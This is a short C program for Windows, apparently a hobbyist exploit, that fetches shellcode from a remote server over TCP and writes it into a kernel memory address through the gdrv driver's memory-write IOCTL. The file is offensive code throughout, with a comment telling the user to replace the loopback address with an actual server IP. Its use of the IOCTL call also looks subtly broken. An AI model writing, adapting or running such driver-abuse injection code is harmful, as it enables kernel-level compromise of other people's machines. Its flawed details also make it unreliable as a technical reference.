#include <windows.h>
#include <stdio.h>
#include <winsock2.h>

#define IOCTL_WRITE_MEM 0x222003

// simple as shit
unsigned char* download_shellcode(const char* server_ip, int port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server_addr;
    unsigned char* buffer = malloc(1024);  // Allocate space for shellcode

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));

    recv(sock, buffer, 1024, 0);  // Receive shellcode

    closesocket(sock);
    WSACleanup();

    return buffer;
}

void inject_remote_shellcode(PVOID target_address, const char* server_ip) {
    unsigned char* shellcode = download_shellcode(server_ip, 8080);

    HANDLE hDevice = CreateFileA("\\\\.\\gdrv", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device\n");
        return;
    }

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_WRITE_MEM,
        shellcode,
        1024,
        target_address,
        sizeof(PVOID),
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("Shellcode injected from remote server!\n");
    } else {
        printf("Failed to inject shellcode\n");
    }

    CloseHandle(hDevice);
}

int main() {
    PVOID targetAddress = (PVOID)0xFFFFF78000000380;  // Example only lol 
    inject_remote_shellcode(targetAddress, "127.0.0.1");  // Replace with actual server IP
    return 0;
}
